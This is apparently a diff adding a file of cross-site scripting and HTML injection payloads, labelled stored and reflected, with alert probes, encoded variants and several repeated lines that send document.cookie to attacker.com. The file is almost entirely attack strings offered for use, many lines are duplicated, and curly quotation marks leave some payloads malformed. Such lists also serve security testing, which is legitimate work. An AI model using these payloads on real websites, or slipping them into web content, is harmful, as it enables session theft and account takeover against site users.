@@ -1,0 +1,102 @@
+<script>alert(‘Stored HTML Injection’)</script>
+<img src=”javascript:alert(‘Stored HTML Injection’)”>
+<svg/onload=alert(‘Stored HTML Injection’)>
+
+<iframe src=”javascript:alert(‘Stored HTML Injection’)”>
+<body onload=alert(‘Stored HTML Injection’)>
+<img src=x onerror=alert(‘Stored HTML Injection’)>
+<marquee onstart=alert(‘Stored HTML Injection’)>
+<input type=”image” src=”javascript:alert(‘Stored HTML Injection’)”>
+<img src=1 href=1 onerror=alert(‘Stored HTML Injection’) />
+<input type=”hidden” onkeypress=”alert(‘Stored HTML Injection’)”>
+<audio onloadstart=”alert(‘Stored HTML Injection’)”>
+<form onsubmit=”alert(‘Stored HTML Injection’)”>
+<textarea onchange=”alert(‘Stored HTML Injection’)”>
+<base href=”javascript:alert(‘Stored HTML Injection’)”>
+<a href=”javascript:alert(‘Stored HTML Injection’)”>Click me</a>
+<object data=”javascript:alert(‘Stored HTML Injection’)”>
+<img src=”x” onmouseover=”alert(‘Stored HTML Injection’)”>
+<script>document.write(‘<iframe src=”https://attacker.com/steal-cookies?cookie=' + document.cookie + ‘“></iframe>’);</script>
+<body background=”javascript:alert(‘Stored HTML Injection’)”>
+<embed src=”javascript:alert(‘Stored HTML Injection’)”>
+<script>alert(‘Reflected HTML Injection’)</script>
+<img src=”javascript:alert(‘Reflected HTML Injection’)”>
+<svg/onload=alert(‘Reflected HTML Injection’)>
+<iframe src=”javascript:alert(‘Reflected HTML Injection’)”>
+<body onload=alert(‘Reflected HTML Injection’)>
+<img src=x onerror=alert(‘Reflected HTML Injection’)>
+<marquee onstart=alert(‘Reflected HTML Injection’)>
+<input type=”image” src=”javascript:alert(‘Reflected HTML Injection’)”>
+<img src=1 href=1 onerror=alert(‘Reflected HTML Injection’) />
+<input type=”hidden” onkeypress=”alert(‘Reflected HTML Injection’)”>
+<audio onloadstart=”alert(‘Reflected HTML Injection’)”>
+<form onsubmit=”alert(‘Reflected HTML Injection’)”>
+<textarea onchange=”alert(‘Reflected HTML Injection’)”>
+<base href=”javascript:alert(‘Reflected HTML Injection’)”>
+<a href=”javascript:alert(‘Reflected HTML Injection’)”>Click me</a>
+<object data=”javascript:alert(‘Reflected HTML Injection’)”>
+<img src=”x” onmouseover=”alert(‘Reflected HTML Injection’)”>
+<script>document.write(‘<iframe src=”https://attacker.com/steal-cookies?cookie=' + document.cookie + ‘“></iframe>’);</script>
+<body background=”javascript:alert(‘Reflected HTML Injection’)”>
+<embed src=”javascript:alert(‘Reflected HTML Injection’)”>
+<svg/onload=alert(‘Stored HTML Injection’)>
+<body onload=alert(‘Stored HTML Injection’)>
+<img src=x onerror=alert(‘Stored HTML Injection’)>
+<marquee onstart=alert(‘Stored HTML Injection’)>
+<input type=”image” src=”javascript:alert(‘Stored HTML Injection’)”>
+<img src=1 href=1 onerror=alert(‘Stored HTML Injection’) />
+<input type=”hidden” onkeypress=”alert(‘Stored HTML Injection’)”>
+<audio onloadstart=”alert(‘Stored HTML Injection’)”>
+<form onsubmit=”alert(‘Stored HTML Injection’)”>
+<textarea onchange=”alert(‘Stored HTML Injection’)”>
+<base href=”javascript:alert(‘Stored HTML Injection’)”>
+<a href=”javascript:alert(‘Stored HTML Injection’)”>Click me</a>
+<object data=”javascript:alert(‘Stored HTML Injection’)”>
+<img src=”x” onmouseover=”alert(‘Stored HTML Injection’)”>
+<script>document.write(‘<iframe src=”https://attacker.com/steal-cookies?cookie=' + document.cookie + ‘“></iframe>’);</script>
+<body background=”javascript:alert(‘Stored HTML Injection’)”>
+<embed src=”javascript:alert(‘Stored HTML Injection’)”>
+<img src=”javascript:alert(‘Stored HTML Injection’)” onerror=”alert(‘Stored HTML Injection’)”>
+<body><svg><script>alert(‘Stored HTML Injection’)</script></svg></body>
+<a href=”data:text/html,<script>alert(‘Stored HTML Injection’)</script>”>Click me</a>
+Reflected HTML Injection Payloads:
+<svg/onload=alert(‘Reflected HTML Injection’)>
+<body onload=alert(‘Reflected HTML Injection’)>
+<img src=x onerror=alert(‘Reflected HTML Injection’)>
+<marquee onstart=alert(‘Reflected HTML Injection’)>
+<input type=”image” src=”javascript:alert(‘Reflected HTML Injection’)”>
+<img src=1 href=1 onerror=alert(‘Reflected HTML Injection’) />
+<input type=”hidden” onkeypress=”alert(‘Reflected HTML Injection’)”>
+<audio onloadstart=”alert(‘Reflected HTML Injection’)”>
+<form onsubmit=”alert(‘Reflected HTML Injection’)”>
+<textarea onchange=”alert(‘Reflected HTML Injection’)”>
+<base href=”javascript:alert(‘Reflected HTML Injection’)”>
+<a href=”javascript:alert(‘Reflected HTML Injection’)”>Click me</a>
+<object data=”javascript:alert(‘Reflected HTML Injection’)”>
+<img src=”x” onmouseover=”alert(‘Reflected HTML Injection’)”>
+<script>document.write(‘<iframe src=”https://attacker.com/steal-cookies?cookie=' + document.cookie + ‘“></iframe>’);</script>
+<body background=”javascript:alert(‘Reflected HTML Injection’)”>
+<embed src=”javascript:alert(‘Reflected HTML Injection’)”>
+<img src=”javascript:alert(‘Reflected HTML Injection’)” onerror=”alert(‘Reflected HTML Injection’)”>
+<body><svg><script>alert(‘Reflected HTML Injection’)</script></svg></body>
+<a href=”data:text/html,<script>alert(‘Reflected HTML Injection’)</script>”>Click me</a>
+<img src=”javascript:alert(String.fromCharCode(88,83,83))”>
+<svg onload=alert(String.fromCharCode(88,83,83))>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<object data=”data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=”>
+<img src=x onerror=alert(String.fromCharCode(88,83,83))>
+<a href=”javascript:alert(String.fromCharCode(88,83,83))”>Click me</a>
+<marquee onstart=alert(String.fromCharCode(88,83,83))>
+<input type=”image” src=”javascript:alert(String.fromCharCode(88,83,83))”>
+<input type=”text” value=”><img src=x onerror=alert(‘XSS’)”>
+<a href=”javascript:void(0)” onmouseover=alert(String.fromCharCode(88,83,83))>Click me</a>
+<audio src onloadstart=”alert(String.fromCharCode(88,83,83))”>
+<video><source onerror=”javascript:alert(String.fromCharCode(88,83,83))”>
+<iframe src=”javascript:alert(String.fromCharCode(88,83,83))”>
+<body onload=alert(String.fromCharCode(88,83,83))>
+<svg onload=alert(String.fromCharCode(88,83,83))>
+<img src=x onerror=alert(String.fromCharCode(88,83,83))>
+<marquee onstart=alert(String.fromCharCode(88,83,83))>
+<input type=”image” src=”javascript:alert(String.fromCharCode(88,83,83))”>
+<input type=”text” value=”><img src=x onerror=alert(‘XSS’)”>
+<a href=”javascript:void(0)” onmouseover=alert(String.fromCharCode(88,83,83))>Click me</a>
